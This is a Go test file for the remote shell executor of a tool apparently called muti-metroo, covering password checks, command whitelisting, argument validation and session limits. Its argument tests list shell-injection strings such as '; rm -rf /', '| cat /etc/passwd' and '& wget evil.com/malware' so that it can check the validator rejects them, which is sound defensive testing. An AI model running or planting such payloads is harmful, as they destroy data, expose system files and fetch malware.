package shell

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/postalsys/muti-metroo/internal/rpc"
)

func TestNewExecutor(t *testing.T) {
	tests := []struct {
		name   string
		config Config
	}{
		{
			name: "disabled",
			config: Config{
				Enabled: false,
			},
		},
		{
			name: "streaming only",
			config: Config{
				Enabled: true,
				Streaming: StreamingConfig{
					Enabled:     true,
					MaxDuration: 1 * time.Hour,
				},
				Interactive: InteractiveConfig{
					Enabled: false,
				},
				MaxSessions: 10,
			},
		},
		{
			name: "interactive only",
			config: Config{
				Enabled: true,
				Streaming: StreamingConfig{
					Enabled: false,
				},
				Interactive: InteractiveConfig{
					Enabled:         true,
					AllowedCommands: []string{"bash", "sh"},
				},
				MaxSessions: 5,
			},
		},
		{
			name: "both modes",
			config: Config{
				Enabled: true,
				Streaming: StreamingConfig{
					Enabled:     true,
					MaxDuration: 24 * time.Hour,
				},
				Interactive: InteractiveConfig{
					Enabled:         true,
					AllowedCommands: []string{"*"},
				},
				MaxSessions:  10,
				PasswordHash: rpc.MustHashPassword("testpassword"),
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(tt.config)
			if exec == nil {
				t.Fatal("NewExecutor() returned nil")
			}

			if exec.config.Enabled != tt.config.Enabled {
				t.Errorf("config.Enabled = %v, want %v", exec.config.Enabled, tt.config.Enabled)
			}
		})
	}
}

func TestExecutor_ValidateAuth(t *testing.T) {
	password := "secretpassword"
	hash := rpc.MustHashPassword(password)

	tests := []struct {
		name         string
		passwordHash string
		password     string
		wantErr      bool
	}{
		{
			name:         "no password configured",
			passwordHash: "",
			password:     "",
			wantErr:      false,
		},
		{
			name:         "correct password",
			passwordHash: hash,
			password:     password,
			wantErr:      false,
		},
		{
			name:         "wrong password",
			passwordHash: hash,
			password:     "wrongpassword",
			wantErr:      true,
		},
		{
			name:         "empty password when required",
			passwordHash: hash,
			password:     "",
			wantErr:      true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:      true,
				PasswordHash: tt.passwordHash,
			})

			err := exec.ValidateAuth(tt.password)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAuth() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestExecutor_IsCommandAllowed(t *testing.T) {
	tests := []struct {
		name        string
		whitelist   []string
		command     string
		interactive bool
		want        bool
	}{
		{
			name:        "empty whitelist - nothing allowed",
			whitelist:   []string{},
			command:     "ls",
			interactive: false,
			want:        false,
		},
		{
			name:        "wildcard allows all",
			whitelist:   []string{"*"},
			command:     "anything",
			interactive: false,
			want:        true,
		},
		{
			name:        "exact match",
			whitelist:   []string{"ls", "cat", "echo"},
			command:     "cat",
			interactive: false,
			want:        true,
		},
		{
			name:        "not in whitelist",
			whitelist:   []string{"ls", "cat"},
			command:     "rm",
			interactive: false,
			want:        false,
		},
		{
			name:        "path not allowed",
			whitelist:   []string{"bash"},
			command:     "/bin/bash",
			interactive: false,
			want:        false,
		},
		{
			name:        "wildcard in interactive mode",
			whitelist:   []string{"*"},
			command:     "vim",
			interactive: true,
			want:        true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:   true,
				Whitelist: tt.whitelist,
			})

			got := exec.IsCommandAllowed(tt.command, tt.interactive)
			if got != tt.want {
				t.Errorf("IsCommandAllowed(%q, %v) = %v, want %v", tt.command, tt.interactive, got, tt.want)
			}
		})
	}
}

func TestExecutor_ValidateArgs(t *testing.T) {
	tests := []struct {
		name      string
		whitelist []string
		args      []string
		wantErr   bool
	}{
		{
			name:      "empty args",
			whitelist: []string{"echo"},
			args:      []string{},
			wantErr:   false,
		},
		{
			name:      "wildcard mode - skip validation",
			whitelist: []string{"*"},
			args:      []string{"; rm -rf /"},
			wantErr:   false, // Wildcard mode skips validation
		},
		{
			name:      "shell injection - semicolon",
			whitelist: []string{"echo"},
			args:      []string{"; rm -rf /"},
			wantErr:   true,
		},
		{
			name:      "shell injection - pipe",
			whitelist: []string{"echo"},
			args:      []string{"| cat /etc/passwd"},
			wantErr:   true,
		},
		{
			name:      "shell injection - ampersand",
			whitelist: []string{"echo"},
			args:      []string{"& wget evil.com/malware"},
			wantErr:   true,
		},
		{
			name:      "shell injection - backtick",
			whitelist: []string{"echo"},
			args:      []string{"`id`"},
			wantErr:   true,
		},
		{
			name:      "shell injection - dollar parentheses",
			whitelist: []string{"echo"},
			args:      []string{"$(whoami)"},
			wantErr:   true,
		},
		{
			name:      "absolute path not allowed",
			whitelist: []string{"cat"},
			args:      []string{"/etc/passwd"},
			wantErr:   true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:   true,
				Whitelist: tt.whitelist,
			})
			err := exec.ValidateArgs(tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateArgs(%v) error = %v, wantErr %v", tt.args, err, tt.wantErr)
			}
		})
	}
}

func TestExecutor_AcquireReleaseSession(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 2,
	})

	// Acquire first session
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v for first session", err)
	}

	// Acquire second session
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v for second session", err)
	}

	// Third should fail (max 2)
	if err := exec.AcquireSession(); err == nil {
		t.Error("AcquireSession() should have failed for third session")
	}

	// Release one
	exec.ReleaseSession()

	// Now should succeed
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v after release", err)
	}

	// Check active count
	if exec.ActiveSessions() != 2 {
		t.Errorf("ActiveSessions() = %d, want 2", exec.ActiveSessions())
	}
}

func TestExecutor_NewSession(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping session test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
		Streaming: StreamingConfig{
			Enabled:     true,
			MaxDuration: 10 * time.Second,
		},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	// Start the session
	if err := session.Start(); err != nil {
		t.Fatalf("session.Start() error = %v", err)
	}

	// Wait for completion
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete in time")
	}

	// Check exit code
	if session.ExitCode() != 0 {
		t.Errorf("ExitCode() = %d, want 0", session.ExitCode())
	}
}

func TestExecutor_NewSession_NotWhitelisted(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"ls", "cat"}, // echo not allowed
		Streaming: StreamingConfig{
			Enabled: true,
		},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	_, err := exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for non-whitelisted command")
	}

	if !strings.Contains(err.Error(), "not allowed") {
		t.Errorf("NewSession() error = %q, want error containing 'not allowed'", err.Error())
	}
}

func TestExecutor_NewSession_AuthRequired(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:      true,
		MaxSessions:  10,
		Whitelist:    []string{"*"},
		PasswordHash: rpc.MustHashPassword("secret"),
		Streaming: StreamingConfig{
			Enabled: true,
		},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command:  "echo",
		Args:     []string{"hello"},
		Password: "", // No password
	}

	_, err := exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for missing password")
	}

	if !strings.Contains(err.Error(), "authentication") {
		t.Errorf("NewSession() error = %q, want error containing 'authentication'", err.Error())
	}
}

func TestExecutor_NewSession_SessionLimit(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 1,
		Whitelist:   []string{"*"},
		Streaming: StreamingConfig{
			Enabled: true,
		},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "sleep",
		Args:    []string{"10"},
	}

	// First session
	session1, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session1.Close()
		exec.ReleaseSession()
	}()

	// Second should fail (max 1)
	_, err = exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for session limit")
	}

	if !strings.Contains(err.Error(), "max sessions") {
		t.Errorf("NewSession() error = %q, want error containing 'max sessions'", err.Error())
	}
}

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()

	if cfg.Enabled {
		t.Error("DefaultConfig().Enabled = true, want false")
	}

	if !cfg.Streaming.Enabled {
		t.Error("DefaultConfig().Streaming.Enabled = false, want true")
	}

	if !cfg.Interactive.Enabled {
		t.Error("DefaultConfig().Interactive.Enabled = false, want true")
	}

	if cfg.MaxSessions != 10 {
		t.Errorf("DefaultConfig().MaxSessions = %d, want 10", cfg.MaxSessions)
	}
}

func TestExecutor_SetRPCFallback(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled: true,
	})

	whitelist := []string{"ls", "cat"}
	passwordHash := rpc.MustHashPassword("test")

	exec.SetRPCFallback(whitelist, passwordHash)

	// Test whitelist fallback
	if !exec.IsCommandAllowed("ls", false) {
		t.Error("Expected 'ls' to be allowed via RPC fallback")
	}
	if !exec.IsCommandAllowed("cat", false) {
		t.Error("Expected 'cat' to be allowed via RPC fallback")
	}
	if exec.IsCommandAllowed("echo", false) {
		t.Error("Expected 'echo' to not be allowed")
	}

	// Test password fallback
	if err := exec.ValidateAuth("test"); err != nil {
		t.Errorf("ValidateAuth() error = %v with RPC fallback password", err)
	}
}
